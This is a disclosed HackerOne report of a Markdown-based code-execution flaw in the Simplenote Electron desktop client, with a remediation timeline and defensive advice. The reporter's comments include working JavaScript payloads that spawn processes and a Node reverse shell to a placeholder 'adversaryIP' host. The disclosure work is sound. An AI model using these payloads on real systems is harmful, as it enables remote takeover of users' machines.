---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/desktop
  - os/windows
substate: "resolved"
weakness: "Code Injection"
enriched: true
date: 2017-12-01
submitted: 2017-11-18T17:57:02.877Z
bounty_usd: null
votes: 19
cve: []
program: "[[programs/automattic|Automattic]]"
reporter: "ysx"
source: "https://hackerone.com/reports/291539"
title: "[Simplenote for Windows] Client RCE via External JavaScript Inclusion leveraging Electron"
---
# [Simplenote for Windows] Client RCE via External JavaScript Inclusion leveraging Electron

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 19 | **Program:** Automattic | **Disclosed:** 2017-12-01

- Report: [https://hackerone.com/reports/291539](https://hackerone.com/reports/291539)
- CWE: Code Injection
- Submitted: 2017-11-18T17:57:02.877Z

## Report summary

It was possible to devise a crafted Markdown note, which when previewed, would lead to arbitrary code execution in the Simplenote client prior to version 1.1.0. A malicious note could be shared with another existing Simplenote user via the tag system.

Application execution and reverse shell proofs of concept were demonstrated for Windows and Linux. Thanks to @xknown and @roundhill for the swift remediation, and @edio for assisting with the investigation of this issue.

A blogpost on this issue can be found here: https://ysx.me.uk/taking-note-xss-to-rce-in-the-simplenote-electron-client

## Timeline

- **Report Filed**
- **Report Title Updated**
- **2017-11-18** @ysx: Quick update: for the first code block (external JavaScript file), please use the following JavaScript code instead:

```
var Process = process.binding('process_wrap').Process;
var proc = new Process();
proc.onexit = function(a,b) {};
var env = process.env;
var env_ = [];
for (var key in env) env_.push(key+'='+env[key]);
proc.spawn({file:'cmd.exe',args:['/k netplwiz'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
```

Further examination using the Process Monitor from Sysinternals identifies the `cmd.exe` process (and resultant `netplwiz`) running in the current user context. It appears my additional screenshot has failed to embed, but can be accessed below.

Please let me know if you require any additional information regarding this issue.
- **2017-11-18** @ysx: Please note that the following proof of concept (which can be used in place of the first code block) demonstrates client RCE on **Simplenote for Linux**, confirmed with Ubuntu 16.04.3 LTS and the latest client build:

```
var Process = process.binding('process_wrap').Process;
var proc = new Process();
proc.onexit = function(a,b) {};
var env = process.env;
var env_ = [];
for (var key in env) env_.push(key+'='+env[key]);
proc.spawn({file:'/usr/bin/gnome-calculator',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
```

Would it be possible to update the title portion to `[Simplenote Desktop Clients]` please? Thanks again!
- **2017-11-19** @ysx: Finally, the below JavaScript code, tested on an Ubuntu 16.04.3 target, creates a Node-based **reverse shell** connection from the target machine to `adversaryIP` with the current logged-in user's privilege level.

As with the previous comments, this can also be used in place of the **external JavaScript file** supplied in the first code block.

```
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(8080, "adversaryIP", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
```
- **2017-11-20** @xknown: Hi. Thanks for the report. We'll take a look.
- **2017-11-20** @ysx: No problem @xknown, thanks very much. Also: would it be possible to invite @edio to this report please? We have privately collaborated to further investigate the impact of this bug.

Kind regards

Yasin
- **2017-11-20** @roundhill: Hi everyone,
Thanks for the report. Just wanted to note that you can only share a Simplenote with another existing Simplenote user.

I can't seem to reproduce using our 1.1.0 RC, builds available here: https://github.com/Automattic/simplenote-electron/releases/tag/1.1.0-rc3

Can you please verify?
- **External User Joined**
- **2017-11-20** @edoverflow: Hi @roundhill, 

This issue is reproducible in the latest stable build of Simplenote [v1.0.8](https://github.com/Automattic/simplenote-electron/releases/tag/v1.0.8) and appears to be fixed in 1.1.0 RC.
- **2017-11-20** @roundhill: Great, thanks for confirming. The 1.1.0 update should go out tomorrow.

Related: https://github.com/Automattic/simplenote-electron/issues/487
- **2017-11-20** @edoverflow: The GitHub issue that you referenced does not demonstrate the severity of this issue. In my opinion, this update should be considered a security update and therefore a thorough security advisory might be necessary.
- **2017-11-22** @edoverflow: This morning while launching Simplenote the following message was displayed:

{F241479}

I hope you consider rewording the message to notify your users that this is a security update.
- **2017-11-22** @ysx: Hi @roundhill,

Confirming here also the successful fix in 1.1.0. I have prepared a brief blogpost and am wondering if it would be possible to request disclosure permission, however am completely happy to hold if an advisory is being prepared or further investigation taking place :)

Thanks and kind regards

Yasin
- **2017-11-22** @edoverflow: Just to add one more little suggestion before you close this report as resolved, the [current fix](https://github.com/Automattic/simplenote-electron/pull/612) consists of adding the `showdown-xss-filter` dependency. I would like to emphasise the fact that this project is [not actively maintained](https://github.com/VisionistInc/showdown-xss-filter/commits/master) and you should not depend on an XSS filter to prevent RCE. Please consider introducing a [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
- **2017-11-22** @roundhill: Thanks for the tip about CSP @edio, I will send that along to the team. 

I updated the [blog post](https://simplenote.com/2017/11/20/windows-and-linux-app-update-now-available-2/) with a bullet about the security fix.

And updated the release notes: https://cldup.com/of9LKZOdP8.thumb.png

@ysx a blog post sounds great to me, but will defer to @xknown on the disclosure.
- **2017-11-22** @ysx: Thanks again @roundhill! I've added a preliminary summary to this report, and enclose a confidential preview link to the post – no problem regarding the disclosure.

https://ysx.me.uk/p/0e249ad1-9ce4-4b64-a4e3-7f719f5bbf2d/
- **2017-11-27** @xknown: Hi @ysx, sorry for the delayed response. Please feel free to do a public disclosure if you'd like.
- **2017-11-27** @ysx: No problem @xknown and thanks very much for the approval. I have enclosed below a link to the final post, and please feel free to disclose this report upon marking as Resolved :)

https://ysx.me.uk/taking-note-xss-to-rce-in-the-simplenote-electron-client/
- **2017-11-27** @edoverflow: @xknown & @roundhill: I actually suggest using [DOMPurify](https://github.com/cure53/DOMPurify) instead of the `showdown-xss-filter` project. DOMPurify is actively maintained and as you may know Cure53 are renowned for their security research.
- **2017-11-29** @xknown: @edio that's a better choice indeed, I will send that along to the team.
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
